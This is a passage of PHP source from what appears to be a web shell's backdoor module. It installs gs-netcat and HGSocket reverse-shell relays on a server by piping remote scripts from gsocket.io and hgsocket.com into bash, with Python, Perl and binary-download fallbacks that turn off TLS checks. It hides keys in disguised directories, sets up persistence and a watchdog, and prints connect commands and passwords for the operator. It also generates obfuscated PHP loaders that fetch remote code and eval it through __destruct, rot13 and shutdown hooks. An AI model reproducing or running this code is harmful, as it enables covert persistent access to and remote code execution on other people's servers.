            $installDir = $this->findGsInstallDir();
            $success = false;
            $secret = '';
            $output = '';

            echo "<pre>";
            echo "<b>========== HGSOCKET INSTALLATION ==========</b>\n";
            echo "Install Dir: $installDir\n";
            echo "Method: $method\n\n";

            $envSetup = "export HOME=" . escapeshellarg($installDir) . "; cd " . escapeshellarg($installDir) . "; ";

            $password = '';

            // Helper function to extract HGSocket credentials from output
            // HGSocket format:
            //   Secret   : GSK-XXXXX-XXXXX-XXXXX-XXXXX
            //   Password : XXXXXXXXXXXXXX
            $extractHgsCredentials = function($output) use (&$secret, &$password, &$success) {
                // Extract Secret Key - HGSocket format: "Secret   : GSK-..."
                if (preg_match('/Secret\s*:\s*(GSK-[A-Z0-9]{5,6}-[A-Z0-9]{5,6}-[A-Z0-9]{5,6}-[A-Z0-9]{5,6})/i', $output, $m)) {
                    $secret = $m[1];
                    $success = true;
                } elseif (preg_match('/GSK-[A-Z0-9]{5,6}-[A-Z0-9]{5,6}-[A-Z0-9]{5,6}-[A-Z0-9]{5,6}/i', $output, $m)) {
                    $secret = $m[0];
                    $success = true;
                } elseif (preg_match('/S=(GSK-[A-Z0-9\-]+)/i', $output, $m)) {
                    $secret = $m[1];
                    $success = true;
                }

                // Extract Password - HGSocket format: "Password : XXXXX"
                if (preg_match('/Password\s*:\s*([A-Za-z0-9]{8,32})/i', $output, $pm)) {
                    $password = trim($pm[1]);
                } elseif (preg_match('/Password\s*[:=]\s*([^\s\n\r]+)/i', $output, $pm)) {
                    $password = trim($pm[1]);
                } elseif (preg_match('/pass\s*[:=]\s*([^\s\n\r]+)/i', $output, $pm)) {
                    $password = trim($pm[1]);
                } elseif (preg_match('/P=([A-Za-z0-9]+)/i', $output, $pm)) {
                    $password = trim($pm[1]);
                }
            };

            // Use timeout to prevent 503
            $timeout = 45; // 45 seconds max
            $outputFile = '/tmp/.hgs_install_' . md5($installDir) . '.log';

            switch ($method) {
                case 'auto':
                case 'curl_installer':
                    echo "<b>[1] Installing via curl (timeout {$timeout}s)...</b>\n";
                    flush(); @ob_flush();

                    // Run with timeout
                    $cmd = $envSetup . "timeout {$timeout} bash -c \"\$(curl -fsSL https://hgsocket.com/y)\" > " . escapeshellarg($outputFile) . " 2>&1; cat " . escapeshellarg($outputFile);
                    $output = @shell_exec($cmd);
                    if (empty($output) && @file_exists($outputFile)) {
                        $output = @file_get_contents($outputFile);
                    }

                    echo "<div style='background:#111;padding:5px;border:1px solid #333;max-height:300px;overflow:auto;'>" . nl2br(htmlspecialchars(substr($output, 0, 2500))) . "</div>\n";
                    $extractHgsCredentials($output);
                    if ($success) {
                        echo "\n<font color='green'>HGSocket installed successfully!</font>\n";
                    }
                    if (!$success && $method === 'auto') {
                        echo "\n<b>[2] Trying wget (timeout {$timeout}s)...</b>\n";
                        flush(); @ob_flush();

                        $cmd = $envSetup . "timeout {$timeout} bash -c \"\$(wget -qO- https://hgsocket.com/y)\" > " . escapeshellarg($outputFile) . " 2>&1; cat " . escapeshellarg($outputFile);
                        $output = @shell_exec($cmd);
                        if (empty($output) && @file_exists($outputFile)) {
                            $output = @file_get_contents($outputFile);
                        }

                        echo "<div style='background:#111;padding:5px;border:1px solid #333;max-height:300px;overflow:auto;'>" . nl2br(htmlspecialchars(substr($output, 0, 2500))) . "</div>\n";
                        $extractHgsCredentials($output);
                        if ($success) {
                            echo "\n<font color='green'>HGSocket installed via wget!</font>\n";
                        }
                    }
                    break;

                case 'wget_installer':
                    echo "<b>Installing via wget (timeout {$timeout}s)...</b>\n";
                    flush(); @ob_flush();

                    $cmd = $envSetup . "timeout {$timeout} bash -c \"\$(wget -qO- https://hgsocket.com/y)\" > " . escapeshellarg($outputFile) . " 2>&1; cat " . escapeshellarg($outputFile);
                    $output = @shell_exec($cmd);
                    if (empty($output) && @file_exists($outputFile)) {
                        $output = @file_get_contents($outputFile);
                    }

                    echo "<div style='background:#111;padding:5px;border:1px solid #333;max-height:300px;overflow:auto;'>" . nl2br(htmlspecialchars(substr($output, 0, 2500))) . "</div>\n";
                    $extractHgsCredentials($output);
                    break;
            }

            // Cleanup
            @unlink($outputFile);

            echo "\n";
            // DEBUG: Show extracted values
            echo "<div style='background:#220;border:1px solid #f80;padding:10px;margin:5px 0;'>\n";
            echo "<b style='color:#f80;'>DEBUG - Extracted Values:</b><br>\n";
            echo "Secret (raw): <code>" . htmlspecialchars($secret) . "</code><br>\n";
            echo "Password (raw): <code>" . htmlspecialchars($password) . "</code><br>\n";
            echo "Success: " . ($success ? "true" : "false") . "<br>\n";
            echo "</div>\n";

            if ($success && !empty($secret)) {
                @file_put_contents($installDir . '/.hgs_key', $secret);
                if (!empty($password)) {
                    @file_put_contents($installDir . '/.hgs_pass', $password);
                }
                echo "<div style='border:2px solid #0f0;padding:15px;margin:10px 0;background:#0a0a1a;'>\n";
                echo "<font color='#0f0' size='+1'><b>HGSocket INSTALLED!</b></font>\n\n";
                echo "<table style='width:100%'>\n";
                echo "<tr><td style='width:100px'><b>Secret:</b></td><td><input type='text' value='$secret' style='width:400px;font-family:monospace;background:#1a1a2e;color:#0f0;border:1px solid #0f0;padding:5px;font-size:14px;' readonly onclick='this.select();'></td></tr>\n";
                if (!empty($password)) {
                    echo "<tr><td><b style='color:#ff0'>Password:</b></td><td><input type='text' value='$password' style='width:400px;font-family:monospace;background:#1a1a2e;color:#ff0;border:1px solid #ff0;padding:5px;font-size:14px;' readonly onclick='this.select();'></td></tr>\n";
                } else {
                    echo "<tr><td><b style='color:#f80'>Password:</b></td><td><font color='#f80'>Not detected - check raw output above</font></td></tr>\n";
                }
                echo "</table>\n</div>\n\n";
                echo "<b>CONNECT FROM YOUR MACHINE:</b>\n";
                echo "<div style='background:#001;padding:10px;border:1px solid #333;'>\n";
                echo "<code style='color:#0ff'>S=$secret bash -c \"\$(curl -fsSL https://hgsocket.com/y)\"</code>\n";
                echo "</div>\n\n";
                if (!empty($password)) {
                    echo "<font color='#ff0'><b>When prompted for password, enter: $password</b></font>\n\n";
                }
                echo "<font color='#888'>Saved: $installDir/.hgs_key" . (!empty($password) ? ", $installDir/.hgs_pass" : "") . "</font>\n";
            } else {
                echo "<font color='red'><b>========== FAILED ==========</b></font>\n\n";
                echo "Possible reasons:\n";
                echo "1. Outbound connections blocked\n";
                echo "2. curl/wget not available\n";
                echo "3. HGSocket relay unreachable\n\n";
                if (!empty($output)) {
                    echo "<b>Output:</b>\n" . htmlspecialchars(substr($output, 0, 800));
                }
            }
            echo "</pre>";
        }

        // GSocket Installation (fallback)
        if (isset($_POST['gs_method']) && $socketType === 'gsocket') {
            $method = $_POST['gs_method'];
            $arch = $this->getGsArch();
            $success = false;
            $secret = '';
            $output = '';
            $debugInfo = [];
            $installedPath = '';

            $installDir = $this->findGsInstallDir();
            $authScriptPath = $installDir . '/.gs_auth.sh';
            $authPassword = $this->getStoredAuthPassword($installDir);

            echo "<pre>";
            echo "<b>System Info:</b>\n";
            echo "Architecture: $arch\n";
            echo "Install Dir: $installDir\n";
            echo "Home Dir: " . $this->findGsHomeDir() . "\n";
            echo "Method: $method\n\n";

            $binaryUrls = [
                "https://github.com/hackerschoice/gsocket/releases/latest/download/gs-netcat_linux-{$arch}",
                "https://github.com/hackerschoice/binary/raw/main/gsocket/gs-netcat_linux-{$arch}",
                "https://raw.githubusercontent.com/hackerschoice/binary/main/gsocket/gs-netcat_linux-{$arch}",
            ];

            $envSetup = "export HOME=" . escapeshellarg($installDir) . "; " .
                        "export GS_DSTDIR=" . escapeshellarg($installDir) . "; " .
                        "export TERM=xterm; " .
                        "cd " . escapeshellarg($installDir) . "; ";

            switch ($method) {
                case 'auto':
                    echo "<b>[1] Trying automatic installation (curl)...</b>\n";
                    $cmd = $envSetup . "GS_DSTDIR=" . escapeshellarg($installDir) . " curl -fsSL https://gsocket.io/x 2>/dev/null | bash -s -- -q 2>&1";
                    $output = $this->executeCommand($cmd);
                    if (preg_match('/gs-netcat\s+-s\s+"([^"]+)"/', $output, $m) || preg_match('/Secret:\s*([a-f0-9]{16})/i', $output, $m)) {
                        $secret = $m[1];
                        $installedPath = $installDir . '/gs-netcat';
                        if (!@file_exists($installedPath)) {
                            $whichGs = trim($this->executeCommand("which gs-netcat 2>/dev/null"));
                            if (!empty($whichGs) && @file_exists($whichGs)) {
                                $installedPath = $whichGs;
                            }
                        }
                        if (@file_exists($installedPath) && @is_executable($installedPath)) {
                            $restartResult = $this->ensureAuthAndRestart($installedPath, $secret, $authScriptPath, $installDir, $authPassword);
                            $success = true;
                            echo "<font color='green'>Success with curl installer!</font>\n";
                            echo "<font color='cyan'>Auth script deployed, listener restarted with auth (PID: " . $restartResult['pid'] . ")</font>\n";
                        } else {
                            $debugInfo[] = "curl installer: binary not found at $installedPath";
                        }
                        break;
                    }
                    $debugInfo[] = "curl installer: " . substr($output, 0, 200);

                    echo "<b>[2] Trying official installer (wget)...</b>\n";
                    $cmd = $envSetup . "GS_DSTDIR=" . escapeshellarg($installDir) . " wget -qO- https://gsocket.io/x 2>/dev/null | bash -s -- -q 2>&1";
                    $output = $this->executeCommand($cmd);
                    if (preg_match('/gs-netcat\s+-s\s+"([^"]+)"/', $output, $m) || preg_match('/Secret:\s*([a-f0-9]{16})/i', $output, $m)) {
                        $secret = $m[1];
                        $installedPath = $installDir . '/gs-netcat';
                        if (!@file_exists($installedPath)) {
                            $whichGs = trim($this->executeCommand("which gs-netcat 2>/dev/null"));
                            if (!empty($whichGs) && @file_exists($whichGs)) {
                                $installedPath = $whichGs;
                            }
                        }
                        if (@file_exists($installedPath) && @is_executable($installedPath)) {
                            $restartResult = $this->ensureAuthAndRestart($installedPath, $secret, $authScriptPath, $installDir, $authPassword);
                            $success = true;
                            echo "<font color='green'>Success with wget installer!</font>\n";
                            echo "<font color='cyan'>Auth script deployed, listener restarted with auth (PID: " . $restartResult['pid'] . ")</font>\n";
                        } else {
                            $debugInfo[] = "wget installer: binary not found at $installedPath";
                        }
                        break;
                    }
                    $debugInfo[] = "wget installer: " . substr($output, 0, 200);

                    echo "<b>[3] Trying direct binary download...</b>\n";
                    $gsBinary = $installDir . '/gs-netcat';
                    foreach ($binaryUrls as $idx => $url) {
                        echo "  Trying URL " . ($idx + 1) . "... ";
                        $dlResult = $this->downloadWithRetry($url, $gsBinary, 60, false);
                        if ($dlResult['success']) {
                            echo "<font color='green'>downloaded (" . $dlResult['method'] . ")</font>\n";
                            @chmod($gsBinary, 0755);
                            $this->executeCommand("chmod 755 " . escapeshellarg($gsBinary) . " 2>/dev/null");
                            $testOutput = $this->executeCommand(escapeshellarg($gsBinary) . " --help 2>&1");
                            if (strpos($testOutput, 'gs-netcat') !== false || strpos($testOutput, 'usage') !== false || strpos($testOutput, 'Global Socket') !== false || strpos($testOutput, '-s') !== false) {
                                echo "<font color='green'>binary OK!</font>\n";
                                $installedPath = $gsBinary;
                                $secret = $this->generateSecret();
                                $authScript = $this->generateGsAuthScript($secret, $authPassword);
                                @file_put_contents($authScriptPath, $authScript);
                                @chmod($authScriptPath, 0755);
                                echo "<b>[4] Starting listener...</b>\n";
                                $startResult = $this->startGsListener($gsBinary, $secret, $authScriptPath, $installDir, $authPassword);
                                if ($startResult['success']) {
                                    $success = true;
                                    echo "<font color='green'>Listener started (PID: " . $startResult['pid'] . ", Method: " . $startResult['method'] . ")</font>\n";
                                } else {
                                    $success = true;
                                    echo "<font color='yellow'>Binary ready but listener may need manual start</font>\n";
                                }
                                break 2;
                            } else {
                                echo "<font color='red'>binary test failed</font>\n";
                                $debugInfo[] = "Binary test: " . substr($testOutput, 0, 100);
                            }
                        } else {
                            echo "<font color='red'>download failed</font>\n";
                        }
                    }

                    if (!$success) {
                        echo "\n<b>[5] Trying Python method...</b>\n";
                        $pyScript = $installDir . '/gs_install_' . mt_rand() . '.py';
                        $pyCode = "#!/usr/bin/env python3\nimport urllib.request, subprocess, os, ssl, sys\nos.chdir(" . escapeshellarg($installDir) . ")\nos.environ['HOME'] = " . escapeshellarg($installDir) . "\nos.environ['GS_DSTDIR'] = " . escapeshellarg($installDir) . "\nctx = ssl.create_default_context()\nctx.check_hostname = False\nctx.verify_mode = ssl.CERT_NONE\ntry:\n    urllib.request.urlretrieve('https://gsocket.io/x', os.path.join(" . escapeshellarg($installDir) . ", 'gs.sh'))\n    result = subprocess.check_output(['bash', os.path.join(" . escapeshellarg($installDir) . ", 'gs.sh'), '-q'], stderr=subprocess.STDOUT, timeout=120)\n    print(result.decode())\nexcept Exception as e:\n    print(str(e))\n    sys.exit(1)\n";
                        @file_put_contents($pyScript, $pyCode);
                        @chmod($pyScript, 0755);
                        $output = $this->executeCommand("python3 " . escapeshellarg($pyScript) . " 2>&1");
                        if (empty($output)) {
                            $output = $this->executeCommand("python " . escapeshellarg($pyScript) . " 2>&1");
                        }
                        @unlink($pyScript);
                        if (preg_match('/gs-netcat\s+-s\s+"([^"]+)"/', $output, $m)) {
                            $secret = $m[1];
                            $installedPath = $installDir . '/gs-netcat';
                            if (@file_exists($installedPath) && @is_executable($installedPath)) {
                                $restartResult = $this->ensureAuthAndRestart($installedPath, $secret, $authScriptPath, $installDir, $authPassword);
                                $success = true;
                                echo "<font color='green'>Success with Python!</font>\n";
                                echo "<font color='cyan'>Auth script deployed, listener restarted with auth (PID: " . $restartResult['pid'] . ")</font>\n";
                            }
                        } else {
                            $debugInfo[] = "Python: " . substr($output, 0, 200);
                        }
                    }

                    if (!$success) {
                        echo "\n<b>[6] Trying Perl method...</b>\n";
                        $perlCmd = "cd " . escapeshellarg($installDir) . " && perl -e 'use LWP::Simple; getstore(\"https://gsocket.io/x\", \"" . $installDir . "/gs.sh\"); system(\"GS_DSTDIR=" . escapeshellarg($installDir) . " bash " . $installDir . "/gs.sh -q\");' 2>&1";
                        $output = $this->executeCommand($perlCmd);
                        if (preg_match('/gs-netcat\s+-s\s+"([^"]+)"/', $output, $m)) {
                            $secret = $m[1];
                            $installedPath = $installDir . '/gs-netcat';
                            if (@file_exists($installedPath) && @is_executable($installedPath)) {
                                $restartResult = $this->ensureAuthAndRestart($installedPath, $secret, $authScriptPath, $installDir, $authPassword);
                                $success = true;
                                echo "<font color='green'>Success with Perl!</font>\n";
                                echo "<font color='cyan'>Auth script deployed, listener restarted with auth (PID: " . $restartResult['pid'] . ")</font>\n";
                            }
                        }
                    }

                    if (!$success) {
                        echo "\n<b>[7] Trying PHP direct binary write...</b>\n";
                        $gsBinary = $installDir . '/gs-netcat';
                        foreach ($binaryUrls as $url) {
                            $ctx = @stream_context_create(['http' => ['timeout' => 60, 'header' => "User-Agent: Mozilla/5.0\r\n"], 'ssl' => ['verify_peer' => false, 'verify_peer_name' => false]]);
                            $binaryData = @file_get_contents($url, false, $ctx);
                            if ($binaryData && strlen($binaryData) > 1000) {
                                @file_put_contents($gsBinary, $binaryData);
                                @chmod($gsBinary, 0755);
                                if (@file_exists($gsBinary) && @filesize($gsBinary) > 1000) {
                                    $secret = $this->generateSecret();
                                    $authScript = $this->generateGsAuthScript($secret, $authPassword);
                                    @file_put_contents($authScriptPath, $authScript);
                                    @chmod($authScriptPath, 0755);
                                    $startResult = $this->startGsListener($gsBinary, $secret, $authScriptPath, $installDir, $authPassword);
                                    $success = true;
                                    $installedPath = $gsBinary;
                                    echo "<font color='green'>Success with PHP direct write!</font>\n";
                                    break;
                                }
                            }
                        }
                    }
                    break;

                case 'curl_installer':
                    $cmd = $envSetup . "bash -c 'curl -fsSL https://gsocket.io/x | GS_DSTDIR=" . escapeshellarg($installDir) . " bash -s -- -q' 2>&1";
                    $output = $this->executeCommand($cmd);
                    if (preg_match('/gs-netcat\s+-s\s+"([^"]+)"/', $output, $m)) {
                        $secret = $m[1];
                        $installedPath = $installDir . '/gs-netcat';
                        if (!@file_exists($installedPath)) {
                            $whichGs = trim($this->executeCommand("which gs-netcat 2>/dev/null"));
                            if (!empty($whichGs) && @file_exists($whichGs)) {
                                $installedPath = $whichGs;
                            }
                        }
                        if (@file_exists($installedPath)) {
                            $restartResult = $this->ensureAuthAndRestart($installedPath, $secret, $authScriptPath, $installDir, $authPassword);
                            $success = true;
                        }
                    }
                    break;

                case 'wget_installer':
                    $cmd = $envSetup . "bash -c 'wget -qO- https://gsocket.io/x | GS_DSTDIR=" . escapeshellarg($installDir) . " bash -s -- -q' 2>&1";
                    $output = $this->executeCommand($cmd);
                    if (preg_match('/gs-netcat\s+-s\s+"([^"]+)"/', $output, $m)) {
                        $secret = $m[1];
                        $installedPath = $installDir . '/gs-netcat';
                        if (!@file_exists($installedPath)) {
                            $whichGs = trim($this->executeCommand("which gs-netcat 2>/dev/null"));
                            if (!empty($whichGs) && @file_exists($whichGs)) {
                                $installedPath = $whichGs;
                            }
                        }
                        if (@file_exists($installedPath)) {
                            $restartResult = $this->ensureAuthAndRestart($installedPath, $secret, $authScriptPath, $installDir, $authPassword);
                            $success = true;
                        }
                    }
                    break;

                case 'direct_binary':
                    $gsBinary = $installDir . '/gs-netcat';
                    foreach ($binaryUrls as $url) {
                        $dlResult = $this->downloadWithRetry($url, $gsBinary, 60, false);
                        if ($dlResult['success']) {
                            @chmod($gsBinary, 0755);
                            $this->executeCommand("chmod 755 " . escapeshellarg($gsBinary) . " 2>/dev/null");
                            $secret = $this->generateSecret();
                            $authScript = $this->generateGsAuthScript($secret, $authPassword);
                            @file_put_contents($authScriptPath, $authScript);
                            @chmod($authScriptPath, 0755);
                            $startResult = $this->startGsListener($gsBinary, $secret, $authScriptPath, $installDir, $authPassword);
                            $success = true;
                            $installedPath = $gsBinary;
                            break;
                        }
                    }
                    break;

                case 'manual_secret':
                    $gsBinary = $installDir . '/gs-netcat';
                    $customSecret = isset($_POST['custom_secret']) ? trim($_POST['custom_secret']) : '';
                    if (empty($customSecret)) {
                        $customSecret = $this->generateSecret();
                    }
                    foreach ($binaryUrls as $url) {
                        $dlResult = $this->downloadWithRetry($url, $gsBinary, 60, false);
                        if ($dlResult['success']) {
                            @chmod($gsBinary, 0755);
                            $this->executeCommand("chmod 755 " . escapeshellarg($gsBinary) . " 2>/dev/null");
                            $authScript = $this->generateGsAuthScript($customSecret, $authPassword);
                            @file_put_contents($authScriptPath, $authScript);
                            @chmod($authScriptPath, 0755);
                            $startResult = $this->startGsListener($gsBinary, $customSecret, $authScriptPath, $installDir, $authPassword);
                            $success = true;
                            $secret = $customSecret;
                            $installedPath = $gsBinary;
                            break;
                        }
                    }
                    break;
            }

            echo "\n";
            if ($success && !empty($secret)) {
                if (!empty($installedPath)) {
                    if (!@file_exists($authScriptPath) || @filesize($authScriptPath) < 50) {
                        $authScript = $this->generateGsAuthScript($secret, $authPassword);
                        @file_put_contents($authScriptPath, $authScript);
                        @chmod($authScriptPath, 0755);
                    }
                    $verifyCheck = "ps aux 2>/dev/null | grep -v grep | grep 'gs-netcat' | grep " . escapeshellarg($secret);
                    $verifyOutput = trim($this->executeCommand($verifyCheck));
                    if (empty($verifyOutput)) {
                        echo "<font color='yellow'>Listener not detected, restarting with auth...</font>\n";
                        $restartResult = $this->startGsListener($installedPath, $secret, $authScriptPath, $installDir, $authPassword);
                        if ($restartResult['success']) {
                            echo "<font color='green'>Listener restarted (PID: " . $restartResult['pid'] . ")</font>\n";
                        }
                    } else {
                        if (strpos($verifyOutput, $authScriptPath) === false) {
                            echo "<font color='yellow'>Listener running without auth, restarting with auth...</font>\n";
                            $restartResult = $this->ensureAuthAndRestart($installedPath, $secret, $authScriptPath, $installDir, $authPassword);
                            if ($restartResult['success']) {
                                echo "<font color='green'>Listener restarted with auth (PID: " . $restartResult['pid'] . ")</font>\n";
                            }
                        }
                    }
                    $persistResult = $this->persistGsSocket($installedPath, $secret, $authScriptPath, $installDir);
                    echo "<font color='cyan'>Persistence configured (rc files + watchdog defunct)</font>\n";
                    echo "<font color='cyan'>Key stored at: $installDir/.gs_key</font>\n";
                    echo "<font color='cyan'>Auth script: $authScriptPath</font>\n";
                }
                echo "<font color='green'><b>========== SUCCESS ==========</b></font>\n\n";
                echo "<b>Binary Location:</b> " . ($installedPath ?: 'auto-installed') . "\n";
                echo "<b>Install Directory:</b> $installDir\n\n";
                echo "<b>Secret Key:</b> <input type='text' value='$secret' style='width:250px;font-family:monospace;background:#1a1a2e;color:#0f0;border:1px solid #333;padding:3px;' readonly onclick='this.select();'>\n";
                echo "<b>Auth Password:</b> <input type='text' value='$authPassword' style='width:200px;font-family:monospace;background:#1a1a2e;color:#ff0;border:1px solid #333;padding:3px;' readonly onclick='this.select();'>\n\n";
                echo "<b>Connect from your machine with:</b>\n";
                echo "<input type='text' value='gs-netcat -s \"$secret\" -i' style='width:450px;font-family:monospace;background:#1a1a2e;color:#0f0;border:1px solid #333;padding:5px;' readonly onclick='this.select();'>\n\n";
                echo "<b>Or interactive shell:</b>\n";
                echo "<input type='text' value='S=\"$secret\" bash -c \"\$(curl -fsSL gsocket.io/x)\"' style='width:550px;font-family:monospace;background:#1a1a2e;color:#0f0;border:1px solid #333;padding:5px;' readonly onclick='this.select();'>\n\n";
                echo "<font color='yellow'>After connect, enter auth password: <b>$authPassword</b></font>\n";
            } else {
                echo "<font color='red'><b>========== FAILED ==========</b></font>\n\n";
                echo "<b>Possible reasons:</b>\n";
                echo "1. Outbound connections blocked by firewall\n";
                echo "2. curl/wget/php not available or restricted\n";
                echo "3. No writable directory with execute permission\n";
                echo "4. Binary architecture mismatch\n";
                echo "5. SELinux or AppArmor restrictions\n";
                echo "6. /tmp mounted with noexec flag\n\n";
                if (!empty($debugInfo)) {
                    echo "<b>Debug Info:</b>\n";
                    foreach ($debugInfo as $info) {
                        echo htmlspecialchars($info) . "\n";
                    }
                }
                if (!empty($output)) {
                    echo "\n<b>Last Output:</b>\n" . htmlspecialchars(substr($output, 0, 500));
                }
            }
            echo "</pre>";
        }

        echo "<form method='post'>";
        echo "<input type='hidden' name='a' value='gs'>";
        echo "<input type='hidden' name='c' value='".str_rot13($this->workingDirectory)."'>";
        echo "<table>";
        echo "<tr><td><b>Socket Type:</b></td><td>";
        echo "<select name='socket_type' style='width:300px;' onchange='updateMethodOptions(this.value)'>";
        echo "<option value='hgsocket'" . ($socketType === 'hgsocket' ? ' selected' : '') . ">HGSocket (Primary - Self-hosted, Private Relay)</option>";
        echo "<option value='gsocket'" . ($socketType === 'gsocket' ? ' selected' : '') . ">GSocket (Fallback - gsocket.io Public Relay)</option>";
        echo "</select></td></tr>";
        echo "<tr><td>Method:</td><td><select name='gs_method' id='gs_method_select'>";
        echo "<option value='auto'>Auto (Recommended)</option>";
        echo "<option value='curl_installer'>Curl Installer</option>";
        echo "<option value='wget_installer'>Wget Installer</option>";
        echo "<option value='direct_binary'>Direct Binary (GSocket only)</option>";
        echo "<option value='manual_secret'>Manual Secret (GSocket only)</option>";
        echo "</select></td></tr>";
        echo "<tr><td>Custom Secret:</td><td><input type='text' name='custom_secret' placeholder='Leave empty for auto-generate' style='width:250px;'></td></tr>";
        echo "<tr><td></td><td><input type='submit' value='Install Remote Socket' style='background:#4CAF50;color:white;padding:8px 16px;border:none;cursor:pointer;'></td></tr>";
        echo "</table></form>";
        echo "<script>function updateMethodOptions(type){var sel=document.getElementById('gs_method_select');var opts=sel.options;for(var i=0;i<opts.length;i++){if(type==='hgsocket'&&(opts[i].value==='direct_binary'||opts[i].value==='manual_secret')){opts[i].disabled=true;}else{opts[i].disabled=false;}}}</script>";

        echo "<br><b>Current Installation Status:</b><br>";
        $homeDir = $this->findGsHomeDir();

        // Check HGSocket keys
        echo "<b style='color:#0ff;'>HGSocket:</b><br>";
        $hgsKeyPaths = [
            $homeDir . '/.config/htop/.hgs_key',
            $homeDir . '/.config/.hgs_key',
            $homeDir . '/.local/share/.hgs_key',
            $homeDir . '/.cache/.hgs_key',
            $homeDir . '/.hgs_key',
        ];
        $hgsFound = false;
        foreach ($hgsKeyPaths as $kp) {
            if (@file_exists($kp)) {
                $storedKey = trim(@file_get_contents($kp));
                if (!empty($storedKey)) {
                    echo "<font color='lime'>HGSocket Key: $storedKey</font><br>";
                    // Check for stored password
                    $passFile = str_replace('.hgs_key', '.hgs_pass', $kp);
                    if (@file_exists($passFile)) {
                        $storedPass = trim(@file_get_contents($passFile));
                        if (!empty($storedPass)) {
                            echo "<font color='yellow'>Password: $storedPass</font><br>";
                        }
                    }
                    echo "<font color='gray'>Location: $kp</font><br>";
                    $hgsFound = true;
                }
            }
        }
        if (!$hgsFound) {
            echo "<font color='gray'>No HGSocket installation found</font><br>";
        }

        // Check GSocket binaries and keys
        echo "<br><b style='color:#ff0;'>GSocket:</b><br>";
        $checkPaths = [
            $homeDir . '/.config/htop/gs-netcat',
            $homeDir . '/.config/gs-netcat',
            $homeDir . '/.local/share/gs-netcat',
            $homeDir . '/.cache/gs-netcat',
            '/usr/local/bin/gs-netcat',
            '/usr/bin/gs-netcat',
            '/dev/shm/gs-netcat',
            '/var/tmp/gs-netcat',
            '/tmp/gs-netcat',
            $homeDir . '/bin/gs-netcat',
            $homeDir . '/.local/bin/gs-netcat',
        ];
        $gsFound = false;
        foreach ($checkPaths as $path) {
            if (@file_exists($path)) {
                $perms = substr(sprintf('%o', @fileperms($path)), -4);
                echo "<font color='green'>Binary: $path (perms: $perms)</font><br>";
                $gsFound = true;
            }
        }
        $keyPaths = [
            $homeDir . '/.config/htop/.gs_key',
            $homeDir . '/.config/.gs_key',
            $homeDir . '/.local/share/.gs_key',
            $homeDir . '/.cache/.gs_key',
        ];
        foreach ($keyPaths as $kp) {
            if (@file_exists($kp)) {
                $storedKey = trim(@file_get_contents($kp));
                if (!empty($storedKey)) {
                    $passFile = dirname($kp) . '/.gs_pass';
                    $storedPass = @file_exists($passFile) ? trim(@file_get_contents($passFile)) : 'N/A';
                    echo "<font color='cyan'>GSocket Key: $storedKey</font><br>";
                    echo "<font color='yellow'>Auth Password: $storedPass</font><br>";
                    $gsFound = true;
                }
            }
        }
        if (!$gsFound) {
            echo "<font color='gray'>No GSocket installation found</font><br>";
        }

        $psOutput = $this->executeCommand("ps aux 2>/dev/null | grep -v grep | grep -E 'gs-netcat|hgsocket'");
        if (!empty(trim($psOutput))) {
            echo "<br><b>Running Socket processes:</b><br><pre>" . htmlspecialchars($psOutput) . "</pre>";
        }
        echo "</div>";
    }

    protected function findPublicHtml() {
        $docRoot = $_SERVER["DOCUMENT_ROOT"]; if (strpos($docRoot, "public_html") !== false) return $docRoot;
        $cwd = $this->workingDirectory; $parts = explode("/", $cwd);
        foreach ($parts as $i => $part) if ($part == "public_html") return implode("/", array_slice($parts, 0, $i + 1));
        return $docRoot;
    }

    protected function generateLoader($type, $url) {
        $urlHex = '';
        for ($i = 0; $i < strlen($url); $i++) {
            $urlHex .= '\\x' . dechex(ord($url[$i]));
        }
        $loaders = [
            'ad_ob' => '<?php class x{function __construct(){ob_start([$this,"p"]);}function p($b){return"";}function __destruct(){ob_end_clean();if(isset($_GET["load"])){$u="'.$urlHex.'";$x=@file_get_contents($u);if(!$x&&function_exists("curl_init")){$c=@curl_init();@curl_setopt($c,CURLOPT_URL,$u);@curl_setopt($c,CURLOPT_RETURNTRANSFER,1);@curl_setopt($c,CURLOPT_FOLLOWLOCATION,1);@curl_setopt($c,CURLOPT_SSL_VERIFYPEER,0);@curl_setopt($c,CURLOPT_TIMEOUT,30);$x=@curl_exec($c);@curl_close($c);}if($x){@eval("?>".$x);}}}}new x;',
            'ad_destruct' => '<?php class d{private $u,$g;function __construct(){$this->u="'.$urlHex.'";$this->g=isset($_GET["load"]);}function __destruct(){if($this->g){$x=@file_get_contents($this->u,0,@stream_context_create(["ssl"=>["verify_peer"=>0]]));if(!$x&&function_exists("curl_init")){$c=@curl_init($this->u);@curl_setopt($c,CURLOPT_RETURNTRANSFER,1);@curl_setopt($c,CURLOPT_SSL_VERIFYPEER,0);$x=@curl_exec($c);@curl_close($c);}if($x)@eval("?>".$x);}}}new d;',
            'ad_callback' => '<?php if(isset($_GET["load"])){$u="'.$urlHex.'";$x=@file_get_contents($u,0,@stream_context_create(["ssl"=>["verify_peer"=>0]]));if(!$x&&function_exists("curl_init")){$c=@curl_init($u);@curl_setopt($c,CURLOPT_RETURNTRANSFER,1);@curl_setopt($c,CURLOPT_SSL_VERIFYPEER,0);$x=@curl_exec($c);@curl_close($c);}if($x){$f=function($d){@eval("?>".$d);};@array_map($f,[$x]);}}',
            'ad_varfunc' => '<?php if(isset($_GET["load"])){$u="'.$urlHex.'";$x=@file_get_contents($u,0,@stream_context_create(["ssl"=>["verify_peer"=>0]]));if(!$x&&function_exists("curl_init")){$c=@curl_init($u);@curl_setopt($c,CURLOPT_RETURNTRANSFER,1);@curl_setopt($c,CURLOPT_SSL_VERIFYPEER,0);$x=@curl_exec($c);@curl_close($c);}if($x){$e=str_rot13("riny");$e("?>".$x);}}',
            'ad_shutdown' => '<?php register_shutdown_function(function(){if(isset($_GET["load"])){$u="'.$urlHex.'";$x=@file_get_contents($u,0,@stream_context_create(["ssl"=>["verify_peer"=>0]]));if(!$x&&function_exists("curl_init")){$c=@curl_init($u);@curl_setopt($c,CURLOPT_RETURNTRANSFER,1);@curl_setopt($c,CURLOPT_SSL_VERIFYPEER,0);$x=@curl_exec($c);@curl_close($c);}if($x)@eval("?>".$x);}});',
